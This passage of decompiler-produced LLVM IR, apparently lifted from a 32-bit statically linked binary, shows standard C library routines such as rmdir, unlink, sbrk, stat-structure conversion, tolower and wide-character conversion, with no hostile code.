  %v2_8062163 = inttoptr i32 %v1_8062163 to i32*
  store i32 0, i32* %v2_8062163, align 4
  %v5_8062165 = add i32 %v0_806216334, -8
  %v6_8062165 = inttoptr i32 %v5_8062165 to i32*
  store i32 %stack_var_-32.038, i32* %v6_8062165, align 4
  %v5_8062168 = add i32 %v0_806216334, -12
  %v6_8062168 = inttoptr i32 %v5_8062168 to i32*
  store i32 %stack_var_-36.037, i32* %v6_8062168, align 4
  %v5_806216b = add i32 %v0_806216334, -16
  %v6_806216b = inttoptr i32 %v5_806216b to i32*
  store i32 %arg1, i32* %v6_806216b, align 4
  %v4_806216e = call i32 @__libc_lseek64(i32 %v2_8062159, i32 %stack_var_-36.037, i32 %stack_var_-32.038, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_806216e, i32* %eax.global-to-local, align 4
  %v0_8062176 = load i32, i32* @esi, align 4
  %v15_8062176 = icmp eq i32 %v0_8062176, %tmp13
  %v1_8062179 = icmp eq i1 %v15_8062176, false
  br i1 %v1_8062179, label %dec_label_pc_80621e7, label %dec_label_pc_806217b

dec_label_pc_806217b:                             ; preds = %dec_label_pc_8062163
  %v1_806217b = call i32 @__errno_location(i32 %v2_8062159)
  store i32 %v1_806217b, i32* %eax.global-to-local, align 4
  %v1_8062180 = inttoptr i32 %v1_806217b to i32*
  store i32 22, i32* %v1_8062180, align 4
  br label %dec_label_pc_8062186

dec_label_pc_8062186:                             ; preds = %dec_label_pc_806212a, %dec_label_pc_806211b, %dec_label_pc_806217b
  br label %dec_label_pc_80621ec

dec_label_pc_806218b:                             ; preds = %dec_label_pc_8062149
  %v1_806218b = add i32 %v0_806219736, 8
  %v2_806218b = inttoptr i32 %v1_806218b to i32*
  %v3_806218b = load i32, i32* %v2_806218b, align 4
  store i32 %v3_806218b, i32* %eax.global-to-local, align 4
  %v1_806218e = add i32 %v0_806219736, 12
  %v2_806218e = inttoptr i32 %v1_806218e to i32*
  %v3_806218e = load i32, i32* %v2_806218e, align 4
  store i32 %v3_806218e, i32* %edx.global-to-local, align 4
  %v1_8062197 = inttoptr i32 %v0_806219736 to i32*
  %v2_8062197 = load i32, i32* %v1_8062197, align 4
  store i32 %v2_8062197, i32* %eax.global-to-local, align 4
  %v1_8062199 = add i32 %v0_806219736, 4
  %v2_8062199 = inttoptr i32 %v1_8062199 to i32*
  %v3_8062199 = load i32, i32* %v2_8062199, align 4
  store i32 %v3_8062199, i32* %edx.global-to-local, align 4
  %v2_806219c = inttoptr i32 %v1_806219c35 to i32*
  store i32 %v2_8062197, i32* %v2_806219c, align 4
  %v0_806219e = load i32, i32* %edx.global-to-local, align 4
  %v1_806219e = load i32, i32* @esi, align 4
  %v2_806219e = add i32 %v1_806219e, 4
  %v3_806219e = inttoptr i32 %v2_806219e to i32*
  store i32 %v0_806219e, i32* %v3_806219e, align 4
  %v0_80621a1 = load i32, i32* @ebx, align 4
  %v1_80621a1 = add i32 %v0_80621a1, 8
  %v2_80621a1 = inttoptr i32 %v1_80621a1 to i32*
  %v3_80621a1 = load i32, i32* %v2_80621a1, align 4
  store i32 %v3_80621a1, i32* %eax.global-to-local, align 4
  %v1_80621a4 = add i32 %v0_80621a1, 12
  %v2_80621a4 = inttoptr i32 %v1_80621a4 to i32*
  %v3_80621a4 = load i32, i32* %v2_80621a4, align 4
  store i32 %v3_80621a4, i32* %edx.global-to-local, align 4
  %v0_80621a7 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80621a7 = trunc i32 %v0_80621a7 to i16
  %v2_80621a7 = load i32, i32* @esi, align 4
  %v3_80621a7 = add i32 %v2_80621a7, 16
  %v4_80621a7 = inttoptr i32 %v3_80621a7 to i16*
  store i16 %v1_80621a7, i16* %v4_80621a7, align 2
  %v0_80621ab = load i32, i32* %eax.global-to-local, align 4
  %v1_80621ab = load i32, i32* @esi, align 4
  %v2_80621ab = add i32 %v1_80621ab, 8
  %v3_80621ab = inttoptr i32 %v2_80621ab to i32*
  store i32 %v0_80621ab, i32* %v3_80621ab, align 4
  %v0_80621ae = load i32, i32* %edx.global-to-local, align 4
  %v1_80621ae = load i32, i32* @esi, align 4
  %v2_80621ae = add i32 %v1_80621ae, 12
  %v3_80621ae = inttoptr i32 %v2_80621ae to i32*
  store i32 %v0_80621ae, i32* %v3_80621ae, align 4
  %v0_80621b1 = load i32, i32* @ebx, align 4
  %v1_80621b1 = add i32 %v0_80621b1, 18
  %v2_80621b1 = inttoptr i32 %v1_80621b1 to i8*
  %v3_80621b1 = load i8, i8* %v2_80621b1, align 1
  %v4_80621b1 = zext i8 %v3_80621b1 to i32
  %v5_80621b1 = load i32, i32* %eax.global-to-local, align 4
  %v6_80621b1 = and i32 %v5_80621b1, -256
  %v7_80621b1 = or i32 %v6_80621b1, %v4_80621b1
  store i32 %v7_80621b1, i32* %eax.global-to-local, align 4
  %v2_80621b4 = load i32, i32* @esi, align 4
  %v3_80621b4 = add i32 %v2_80621b4, 18
  %v4_80621b4 = inttoptr i32 %v3_80621b4 to i8*
  store i8 %v3_80621b1, i8* %v4_80621b4, align 1
  %v0_80621b7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80621b7 = load i32, i32* @esp, align 4
  %v2_80621b7 = add i32 %v1_80621b7, -4
  %v3_80621b7 = inttoptr i32 %v2_80621b7 to i32*
  store i32 %v0_80621b7, i32* %v3_80621b7, align 4
  %v0_80621b8 = load i32, i32* @ebx, align 4
  %v1_80621b8 = add i32 %v0_80621b8, 16
  %v2_80621b8 = inttoptr i32 %v1_80621b8 to i16*
  %v3_80621b8 = load i16, i16* %v2_80621b8, align 2
  %v4_80621b8 = zext i16 %v3_80621b8 to i32
  %v1_80621bc = add nsw i32 %v4_80621b8, -19
  %v2_80621bf = add i32 %v1_80621b7, -8
  %v3_80621bf = inttoptr i32 %v2_80621bf to i32*
  store i32 %v1_80621bc, i32* %v3_80621bf, align 4
  %v0_80621c0 = load i32, i32* @ebx, align 4
  %v1_80621c0 = add i32 %v0_80621c0, 19
  %v2_80621c3 = add i32 %v1_80621b7, -12
  %v3_80621c3 = inttoptr i32 %v2_80621c3 to i32*
  store i32 %v1_80621c0, i32* %v3_80621c3, align 4
  %v0_80621c4 = load i32, i32* @esi, align 4
  %v1_80621c4 = add i32 %v0_80621c4, 19
  store i32 %v1_80621c4, i32* %eax.global-to-local, align 4
  %v2_80621c7 = add i32 %v1_80621b7, -16
  %v3_80621c7 = inttoptr i32 %v2_80621c7 to i32*
  store i32 %v1_80621c4, i32* %v3_80621c7, align 4
  %v3_80621c8 = inttoptr i32 %v2_8062159 to i16*
  %v4_80621c8 = call i32 @memcpy(i16* %v3_80621c8, i32 %v3_806218b, i32 %v3_806218e)
  store i32 %v4_80621c8, i32* %eax.global-to-local, align 4
  %v0_80621cd = load i32, i32* @ebx, align 4
  %v1_80621cd = add i32 %v0_80621cd, 16
  %v2_80621cd = inttoptr i32 %v1_80621cd to i16*
  %v3_80621cd = load i16, i16* %v2_80621cd, align 2
  %v4_80621cd = zext i16 %v3_80621cd to i32
  %v0_80621d1 = load i32, i32* @esp, align 4
  %v1_80621d1 = add i32 %v0_80621d1, 16
  store i32 %v2_8062159, i32* @esi, align 4
  %v2_80621d7 = add i32 %v4_80621cd, %v0_80621cd
  store i32 %v2_80621d7, i32* @ebx, align 4
  store i32 %v5_80621dc, i32* %eax.global-to-local, align 4
  %v7_80621df = icmp ult i32 %v2_80621d7, %v5_80621dc
  br i1 %v7_80621df, label %dec_label_pc_8062149, label %dec_label_pc_80621e7

dec_label_pc_80621e7:                             ; preds = %dec_label_pc_8062130, %dec_label_pc_806218b, %dec_label_pc_8062163
  %v0_80621e7 = phi i32 [ %v0_8062176, %dec_label_pc_8062163 ], [ %tmp13, %dec_label_pc_8062130 ], [ %v2_8062159, %dec_label_pc_806218b ]
  store i32 %v0_80621e7, i32* %eax.global-to-local, align 4
  %v5_80621e9 = sub i32 %v0_80621e7, %tmp13
  br label %dec_label_pc_80621ec

dec_label_pc_80621ec:                             ; preds = %dec_label_pc_8062186, %dec_label_pc_80621e7
  %storemerge = phi i32 [ -1, %dec_label_pc_8062186 ], [ %v5_80621e9, %dec_label_pc_80621e7 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_80620e5, i32* @ebx, align 4
  store i32 %v0_80620e3, i32* %edi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_80621e7, { 1, 0 }
  uselistorder i32 %v2_80621d7, { 2, 1, 0 }
  uselistorder i32 %v3_806218e, { 1, 2, 0 }
  uselistorder i32 %v3_806218b, { 1, 2, 0 }
  uselistorder i32 %v0_8062176, { 1, 0 }
  uselistorder i32 %v2_8062159, { 1, 5, 6, 3, 4, 0, 2 }
  uselistorder i32 %v0_806216334, { 3, 2, 1, 0 }
  uselistorder i32 %v0_806219736, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v5_80621dc, { 2, 3, 0, 1 }
  uselistorder i32 %v5_806210e, { 1, 3, 2, 0, 4 }
  uselistorder i32 %tmp13, { 5, 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 16, 2, 15, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 1, 17, 0, 18 }
  uselistorder i32 19, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32 18, { 1, 2, 3, 0 }
  uselistorder i32 15, { 1, 0, 3, 2 }
  uselistorder i32 30, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80621ec, { 1, 0 }
  uselistorder label %dec_label_pc_80621e7, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8062186, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062149, { 1, 0 }
}

define i32 @rmdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_806226c = load i32, i32* @edi, align 4
  store i32 %v0_806226c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8062274 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_806227c = call i32 @rmdir(i32 %v0_8062274)
  store i32 %v0_8062274, i32* @ebx, align 4
  store i32 %v1_806227c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_806227c, -4095
  br i1 %tmp, label %dec_label_pc_8062294, label %dec_label_pc_8062288

dec_label_pc_8062288:                             ; preds = %entry
  %v1_8062288 = call i32 @__errno_location(i32 %v0_8062274)
  %v0_806228d = load i32, i32* %edi.global-to-local, align 4
  %v1_806228d = sub i32 0, %v0_806228d
  %v2_806228f = inttoptr i32 %v1_8062288 to i32*
  store i32 %v1_806228d, i32* %v2_806228f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8062294

dec_label_pc_8062294:                             ; preds = %entry, %dec_label_pc_8062288
  %v0_8062295 = phi i32 [ %v1_806227c, %entry ], [ -1, %dec_label_pc_8062288 ]
  %v2_8062298 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8062298, i32* @edi, align 4
  ret i32 %v0_8062295

; uselistorder directives
  uselistorder i32 %v1_806227c, { 1, 0, 2 }
  uselistorder i32 %v0_8062274, { 1, 0, 2 }
  uselistorder i32 (i32)* @rmdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8062294, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %v0_806229d = load i32, i32* @ebx, align 4
  %v0_80622a1 = load i32, i32* @global_var_807da44.803, align 4
  %v1_80622a1 = icmp eq i32 %v0_80622a1, 0
  %v1_80622ac = icmp eq i1 %v1_80622a1, false
  br i1 %v1_80622ac, label %dec_label_pc_80622bf, label %dec_label_pc_80622ae

dec_label_pc_80622ae:                             ; preds = %entry
  %v1_80622b3 = call i32 @__GI_brk(i32 0)
  %v2_80622bb = icmp slt i32 %v1_80622b3, 0
  br i1 %v2_80622bb, label %dec_label_pc_80622e1, label %dec_label_pc_80622ae.dec_label_pc_80622bf_crit_edge

dec_label_pc_80622ae.dec_label_pc_80622bf_crit_edge: ; preds = %dec_label_pc_80622ae
  %v0_80622c1.pre = load i32, i32* @global_var_807da44.803, align 4
  br label %dec_label_pc_80622bf

dec_label_pc_80622bf:                             ; preds = %dec_label_pc_80622ae.dec_label_pc_80622bf_crit_edge, %entry
  %v0_80622cf = phi i32 [ %v0_80622c1.pre, %dec_label_pc_80622ae.dec_label_pc_80622bf_crit_edge ], [ %v0_80622a1, %entry ]
  %v1_80622bf = icmp eq i32 %arg1, 0
  %v1_80622c6 = icmp eq i1 %v1_80622bf, false
  br i1 %v1_80622c6, label %dec_label_pc_80622cc, label %dec_label_pc_80622c8

dec_label_pc_80622c8:                             ; preds = %dec_label_pc_80622bf
  br label %dec_label_pc_80622e4

dec_label_pc_80622cc:                             ; preds = %dec_label_pc_80622bf
  store i32 %v0_80622cf, i32* @ebx, align 4
  %v2_80622d1 = add i32 %v0_80622cf, %arg1
  %v1_80622d5 = call i32 @__GI_brk(i32 %v2_80622d1)
  %v2_80622dd = icmp slt i32 %v1_80622d5, 0
  %v1_80622df = icmp eq i1 %v2_80622dd, false
  br i1 %v1_80622df, label %dec_label_pc_80622cc.dec_label_pc_80622e4_crit_edge, label %dec_label_pc_80622e1

dec_label_pc_80622cc.dec_label_pc_80622e4_crit_edge: ; preds = %dec_label_pc_80622cc
  %v0_80622e5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80622e4

dec_label_pc_80622e1:                             ; preds = %dec_label_pc_80622cc, %dec_label_pc_80622ae
  br label %dec_label_pc_80622e4

dec_label_pc_80622e4:                             ; preds = %dec_label_pc_80622cc.dec_label_pc_80622e4_crit_edge, %dec_label_pc_80622c8, %dec_label_pc_80622e1
  %v0_80622e5 = phi i32 [ %v0_80622e5.pre, %dec_label_pc_80622cc.dec_label_pc_80622e4_crit_edge ], [ %v0_80622cf, %dec_label_pc_80622c8 ], [ -1, %dec_label_pc_80622e1 ]
  store i32 %v0_806229d, i32* @ebx, align 4
  ret i32 %v0_80622e5

; uselistorder directives
  uselistorder i32 %v0_80622cf, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_80622e4, { 2, 0, 1 }
}

define i32 @unlink(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80622ec = load i32, i32* @edi, align 4
  store i32 %v0_80622ec, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_80622f4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80622fc = call i32 @unlink(i32 %v0_80622f4)
  store i32 %v1_80622fc, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80622fc, -4095
  br i1 %tmp, label %dec_label_pc_8062314, label %dec_label_pc_8062308

dec_label_pc_8062308:                             ; preds = %entry
  %v1_8062308 = call i32 @__errno_location(i32 %v0_80622f4)
  %v0_806230d = load i32, i32* %edi.global-to-local, align 4
  %v1_806230d = sub i32 0, %v0_806230d
  %v2_806230f = inttoptr i32 %v1_8062308 to i32*
  store i32 %v1_806230d, i32* %v2_806230f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8062314

dec_label_pc_8062314:                             ; preds = %entry, %dec_label_pc_8062308
  %v0_8062315 = phi i32 [ %v1_80622fc, %entry ], [ -1, %dec_label_pc_8062308 ]
  %v2_8062318 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8062318, i32* %edi.global-to-local, align 4
  ret i32 %v0_8062315

; uselistorder directives
  uselistorder i32 %v1_80622fc, { 1, 0, 2 }
  uselistorder i32 (i32)* @unlink, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8062314, { 1, 0 }
}

define i32 @__xstat_conv(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80623af = load i32, i32* @ebx, align 4
  store i32 %v0_80623af, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v4_80623b7 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80623b7, i32* %esi.global-to-local, align 4
  %v3_80623c0 = inttoptr i32 %arg2 to i8*
  %v4_80623c0 = call i32 @__GI_memset(i8* %v3_80623c0, i32 0, i32 88)
  store i32 %v4_80623c0, i32* %eax.global-to-local, align 4
  %v2_80623c5 = load i16, i16* %arg1, align 2
  %v3_80623c5 = zext i16 %v2_80623c5 to i32
  store i32 %v3_80623c5, i32* %eax.global-to-local, align 4
  %v0_80623c8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80623c8 = add i32 %v0_80623c8, 4
  %v2_80623c8 = inttoptr i32 %v1_80623c8 to i32*
  store i32 0, i32* %v2_80623c8, align 4
  %v0_80623cf = load i32, i32* %eax.global-to-local, align 4
  %v1_80623cf = load i32, i32* %ebx.global-to-local, align 4
  %v2_80623cf = inttoptr i32 %v1_80623cf to i32*
  store i32 %v0_80623cf, i32* %v2_80623cf, align 4
  %v0_80623d1 = load i32, i32* %esi.global-to-local, align 4
  %v1_80623d1 = add i32 %v0_80623d1, 4
  %v2_80623d1 = inttoptr i32 %v1_80623d1 to i32*
  %v3_80623d1 = load i32, i32* %v2_80623d1, align 4
  store i32 %v3_80623d1, i32* %eax.global-to-local, align 4
  %v1_80623d4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80623d4 = add i32 %v1_80623d4, 12
  %v3_80623d4 = inttoptr i32 %v2_80623d4 to i32*
  store i32 %v3_80623d1, i32* %v3_80623d4, align 4
  %v0_80623d7 = load i32, i32* %esi.global-to-local, align 4
  %v1_80623d7 = add i32 %v0_80623d7, 8
  %v2_80623d7 = inttoptr i32 %v1_80623d7 to i16*
  %v3_80623d7 = load i16, i16* %v2_80623d7, align 2
  %v4_80623d7 = zext i16 %v3_80623d7 to i32
  store i32 %v4_80623d7, i32* %eax.global-to-local, align 4
  %v1_80623db = load i32, i32* %ebx.global-to-local, align 4
  %v2_80623db = add i32 %v1_80623db, 16
  %v3_80623db = inttoptr i32 %v2_80623db to i32*
  store i32 %v4_80623d7, i32* %v3_80623db, align 4
  %v0_80623de = load i32, i32* %esi.global-to-local, align 4
  %v1_80623de = add i32 %v0_80623de, 10
  %v2_80623de = inttoptr i32 %v1_80623de to i16*
  %v3_80623de = load i16, i16* %v2_80623de, align 2
  %v4_80623de = zext i16 %v3_80623de to i32
  store i32 %v4_80623de, i32* %eax.global-to-local, align 4
  %v1_80623e2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80623e2 = add i32 %v1_80623e2, 20
  %v3_80623e2 = inttoptr i32 %v2_80623e2 to i32*
  store i32 %v4_80623de, i32* %v3_80623e2, align 4
  %v0_80623e5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80623e5 = add i32 %v0_80623e5, 12
  %v2_80623e5 = inttoptr i32 %v1_80623e5 to i16*
  %v3_80623e5 = load i16, i16* %v2_80623e5, align 2
  %v4_80623e5 = zext i16 %v3_80623e5 to i32
  store i32 %v4_80623e5, i32* %eax.global-to-local, align 4
  %v1_80623e9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80623e9 = add i32 %v1_80623e9, 24
  %v3_80623e9 = inttoptr i32 %v2_80623e9 to i32*
  store i32 %v4_80623e5, i32* %v3_80623e9, align 4
  %v0_80623ec = load i32, i32* %esi.global-to-local, align 4
  %v1_80623ec = add i32 %v0_80623ec, 14
  %v2_80623ec = inttoptr i32 %v1_80623ec to i16*
  %v3_80623ec = load i16, i16* %v2_80623ec, align 2
  %v4_80623ec = zext i16 %v3_80623ec to i32
  store i32 %v4_80623ec, i32* %eax.global-to-local, align 4
  %v1_80623f0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80623f0 = add i32 %v1_80623f0, 28
  %v3_80623f0 = inttoptr i32 %v2_80623f0 to i32*
  store i32 %v4_80623ec, i32* %v3_80623f0, align 4
  %v0_80623f3 = load i32, i32* %esi.global-to-local, align 4
  %v1_80623f3 = add i32 %v0_80623f3, 16
  %v2_80623f3 = inttoptr i32 %v1_80623f3 to i16*
  %v3_80623f3 = load i16, i16* %v2_80623f3, align 2
  %v4_80623f3 = zext i16 %v3_80623f3 to i32
  store i32 %v4_80623f3, i32* %eax.global-to-local, align 4
  %v0_80623f7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80623f7 = add i32 %v0_80623f7, 36
  %v2_80623f7 = inttoptr i32 %v1_80623f7 to i32*
  store i32 0, i32* %v2_80623f7, align 4
  %v0_80623fe = load i32, i32* %eax.global-to-local, align 4
  %v1_80623fe = load i32, i32* %ebx.global-to-local, align 4
  %v2_80623fe = add i32 %v1_80623fe, 32
  %v3_80623fe = inttoptr i32 %v2_80623fe to i32*
  store i32 %v0_80623fe, i32* %v3_80623fe, align 4
  %v0_8062401 = load i32, i32* %esi.global-to-local, align 4
  %v1_8062401 = add i32 %v0_8062401, 20
  %v2_8062401 = inttoptr i32 %v1_8062401 to i32*
  %v3_8062401 = load i32, i32* %v2_8062401, align 4
  store i32 %v3_8062401, i32* %eax.global-to-local, align 4
  %v1_8062404 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8062404 = add i32 %v1_8062404, 44
  %v3_8062404 = inttoptr i32 %v2_8062404 to i32*
  store i32 %v3_8062401, i32* %v3_8062404, align 4
  %v0_8062407 = load i32, i32* %esi.global-to-local, align 4
  %v1_8062407 = add i32 %v0_8062407, 24
  %v2_8062407 = inttoptr i32 %v1_8062407 to i32*
  %v3_8062407 = load i32, i32* %v2_8062407, align 4
  store i32 %v3_8062407, i32* %eax.global-to-local, align 4
  %v1_806240a = load i32, i32* %ebx.global-to-local, align 4
  %v2_806240a = add i32 %v1_806240a, 48
  %v3_806240a = inttoptr i32 %v2_806240a to i32*
  store i32 %v3_8062407, i32* %v3_806240a, align 4
  %v0_806240d = load i32, i32* %esi.global-to-local, align 4
  %v1_806240d = add i32 %v0_806240d, 28
  %v2_806240d = inttoptr i32 %v1_806240d to i32*
  %v3_806240d = load i32, i32* %v2_806240d, align 4
  store i32 %v3_806240d, i32* %eax.global-to-local, align 4
  %v1_8062410 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8062410 = add i32 %v1_8062410, 52
  %v3_8062410 = inttoptr i32 %v2_8062410 to i32*
  store i32 %v3_806240d, i32* %v3_8062410, align 4
  %v0_8062413 = load i32, i32* %esi.global-to-local, align 4
  %v1_8062413 = add i32 %v0_8062413, 32
  %v2_8062413 = inttoptr i32 %v1_8062413 to i32*
  %v3_8062413 = load i32, i32* %v2_8062413, align 4
  store i32 %v3_8062413, i32* %eax.global-to-local, align 4
  %v1_8062416 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8062416 = add i32 %v1_8062416, 56
  %v3_8062416 = inttoptr i32 %v2_8062416 to i32*
  store i32 %v3_8062413, i32* %v3_8062416, align 4
  %v0_8062419 = load i32, i32* %esi.global-to-local, align 4
  %v1_8062419 = add i32 %v0_8062419, 40
  %v2_8062419 = inttoptr i32 %v1_8062419 to i32*
  %v3_8062419 = load i32, i32* %v2_8062419, align 4
  store i32 %v3_8062419, i32* %eax.global-to-local, align 4
  %v1_806241c = load i32, i32* %ebx.global-to-local, align 4
  %v2_806241c = add i32 %v1_806241c, 64
  %v3_806241c = inttoptr i32 %v2_806241c to i32*
  store i32 %v3_8062419, i32* %v3_806241c, align 4
  %v0_806241f = load i32, i32* %esi.global-to-local, align 4
  %v1_806241f = add i32 %v0_806241f, 48
  %v2_806241f = inttoptr i32 %v1_806241f to i32*
  %v3_806241f = load i32, i32* %v2_806241f, align 4
  store i32 %v3_806241f, i32* %eax.global-to-local, align 4
  %v1_8062422 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8062422 = add i32 %v1_8062422, 72
  %v3_8062422 = inttoptr i32 %v2_8062422 to i32*
  store i32 %v3_806241f, i32* %v3_8062422, align 4
  %v2_8062428 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8062428, i32* @ebx, align 4
  ret i32 %v3_806241f
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8062430 = add i32 %arg1, 128
  %v6_806243b = icmp ugt i32 %v1_8062430, 383
  br i1 %v6_806243b, label %dec_label_pc_8062446, label %dec_label_pc_806243d

dec_label_pc_806243d:                             ; preds = %entry
  %v0_806243d = load i32, i32* bitcast (i32** @global_var_8074fd4.707 to i32*), align 4
  %v2_8062442 = mul i32 %arg1, 2
  %v3_8062442 = add i32 %v0_806243d, %v2_8062442
  %v4_8062442 = inttoptr i32 %v3_8062442 to i16*
  %v5_8062442 = load i16, i16* %v4_8062442, align 2
  %v6_8062442 = sext i16 %v5_8062442 to i32
  store i32 %v6_8062442, i32* @edx, align 4
  br label %dec_label_pc_8062446

dec_label_pc_8062446:                             ; preds = %entry, %dec_label_pc_806243d
  %v0_8062446 = phi i32 [ %arg1, %entry ], [ %v6_8062442, %dec_label_pc_806243d ]
  ret i32 %v0_8062446

; uselistorder directives
  uselistorder label %dec_label_pc_8062446, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_807b668.662 to i32)
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_806245f = icmp eq i32 %tmp4, 0
  %v1_8062461 = icmp eq i1 %v1_806245f, false
  br i1 %v1_8062461, label %dec_label_pc_8062469, label %dec_label_pc_8062463

dec_label_pc_8062463:                             ; preds = %entry
  %v2_8062463 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_8062469

dec_label_pc_8062469:                             ; preds = %entry, %dec_label_pc_8062463
  %v0_8062485 = phi i32 [ %tmp4, %entry ], [ %v2_8062463, %dec_label_pc_8062463 ]
  %v0_8062471 = phi i32 [ %tmp3, %entry ], [ 0, %dec_label_pc_8062463 ]
  %v2_8062469 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8062469, i32* %stack_var_-8, align 4
  store i32 %v0_8062471, i32* %stack_var_-4, align 4
  %v2_8062480 = ptrtoint i32* %stack_var_-8 to i32
  %v5_8062486 = inttoptr i32 %v0_8062485 to i8*
  %v6_8062486 = call i32 @__GI_wcsnrtombs(i8* %v5_8062486, i32 %v2_8062480, i32 1, i32 16, i32 %tmp)
  %v1_8062490 = icmp eq i32 %v6_8062486, 0
  %v3_8062492 = select i1 %v1_8062490, i32 1, i32 %v6_8062486
  ret i32 %v3_8062492

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8062469, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_80624b1 = inttoptr i32 %tmp to i8*
  %v6_80624b1 = call i32 @__GI_wcsnrtombs(i8* %v5_80624b1, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_80624b1
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-32 = alloca i32, align 4
  %v0_80624bf = load i32, i32* @ebx, align 4
  %v4_80624c3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80624c3, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_80624d3 = icmp eq i8* %arg1, null
  store i1 %v1_80624d3, i1* %zf.global-to-local, align 1
  br i1 %v1_80624d3, label %dec_label_pc_80624e2, label %dec_label_pc_80624d7

dec_label_pc_80624d7:                             ; preds = %entry
  %v12_80624d7 = icmp eq i32 %v4_80624c3, %arg2
  store i1 %v12_80624d7, i1* %zf.global-to-local, align 1
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_80624de = icmp eq i1 %v12_80624d7, false
  br i1 %v1_80624de, label %dec_label_pc_8062505, label %dec_label_pc_80624ff

dec_label_pc_80624e2:                             ; preds = %entry
  %v2_80624e2 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80624e2, i32* %edx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8062503

dec_label_pc_80624eb:                             ; preds = %dec_label_pc_8062513
  %v1_80624eb = call i32 @__errno_location(i32 %v0_80624bf)
  %v1_80624f0 = inttoptr i32 %v1_80624eb to i32*
  store i32 84, i32* %v1_80624f0, align 4
  br label %dec_label_pc_8062539

